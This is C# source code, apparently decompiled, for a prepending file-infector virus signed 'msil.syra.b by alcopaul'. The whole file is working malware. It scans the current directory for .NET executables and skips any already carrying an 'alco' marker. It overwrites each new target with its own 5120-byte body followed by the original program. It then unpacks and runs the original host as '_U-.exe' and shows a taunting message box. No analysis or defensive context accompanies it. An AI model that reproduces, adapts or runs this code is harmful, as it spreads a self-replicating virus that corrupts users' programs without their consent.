using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

internal class msil_syra_by_alcopaul
{
	public class Win32
	{
		[DllImport("shell32.dll", CharSet = CharSet.Auto)]
		public static extern int ShellExecute(int hWnd, string oper, string file, string param, string dir, int type);

		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		public static extern int MessageBox(int hWnd, string text, string caption, uint type);
	}

	public static void Main(string[] args)
	{
		Module module = Assembly.GetExecutingAssembly().GetModules()[0];
		string[] files = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.exe");
		string[] array = files;
		foreach (string text in array)
		{
			try
			{
				AssemblyName.GetAssemblyName(text);
				FileStream fileStream = new FileStream(text, FileMode.OpenOrCreate, FileAccess.Read);
				StreamReader streamReader = new StreamReader(fileStream);
				int num = (int)fileStream.Length;
				int num2 = num - 4;
				streamReader.BaseStream.Seek(num2, SeekOrigin.Begin);
				string text2 = streamReader.ReadLine();
				streamReader.Close();
				string text3 = "alco";
				if (text2 == text3 || text == module.FullyQualifiedName)
				{
					continue;
				}
				try
				{
					Infect(text);
				}
				catch
				{
					goto end_IL_0034;
				}
				break;
				end_IL_0034:;
			}
			catch
			{
			}
		}
		FileStream fileStream2 = new FileStream(module.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader(fileStream2);
		int num3 = (int)fileStream2.Length;
		int num4 = num3 - 5120;
		binaryReader.BaseStream.Seek(5120L, SeekOrigin.Begin);
		byte[] buffer = new byte[checked((uint)num4)];
		int num5 = num4;
		int num6 = 0;
		while (num5 > 0)
		{
			int num7 = binaryReader.Read(buffer, num6, num5);
			if (num7 == 0)
			{
				break;
			}
			num6 += num7;
			num5 -= num7;
		}
		binaryReader.Close();
		FileStream output = new FileStream("_U-.exe", FileMode.OpenOrCreate, FileAccess.Write);
		BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.BaseStream.Seek(0L, SeekOrigin.Begin);
		binaryWriter.Write(buffer);
		binaryWriter.Close();
		string currentDirectory = Directory.GetCurrentDirectory();
		Win32.ShellExecute(0, null, "_U-.exe", null, currentDirectory, 1);
		do
		{
			IL_0194:
			try
			{
				File.Delete("_U-.exe");
			}
			catch
			{
				goto IL_0194;
			}
		}
		while (File.Exists("_U-.exe"));
		Win32.MessageBox(0, "::: now infecting dotnet files only :P :::", "msil.syra.b by alcopaul", 0u);
	}

	public static void Infect(string host)
	{
		Module module = Assembly.GetExecutingAssembly().GetModules()[0];
		FileStream input = new FileStream(module.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader(input);
		binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
		byte[] buffer = new byte[5120];
		int num = 5120;
		int num2 = 0;
		while (num > 0)
		{
			int num3 = binaryReader.Read(buffer, num2, num);
			if (num3 == 0)
			{
				break;
			}
			num2 += num3;
			num -= num3;
		}
		binaryReader.Close();
		FileStream fileStream = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Read);
		BinaryReader binaryReader2 = new BinaryReader(fileStream);
		binaryReader2.BaseStream.Seek(0L, SeekOrigin.Begin);
		byte[] buffer2 = new byte[checked((uint)fileStream.Length)];
		int num4 = (int)fileStream.Length;
		int num5 = 0;
		while (num4 > 0)
		{
			int num6 = binaryReader2.Read(buffer2, num5, num4);
			if (num6 == 0)
			{
				break;
			}
			num5 += num6;
			num4 -= num6;
		}
		binaryReader2.Close();
		FileStream output = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Write);
		BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.BaseStream.Seek(0L, SeekOrigin.Begin);
		binaryWriter.Write(buffer);
		binaryWriter.Write(buffer2);
		binaryWriter.Write("alco");
		binaryWriter.Close();
	}
}
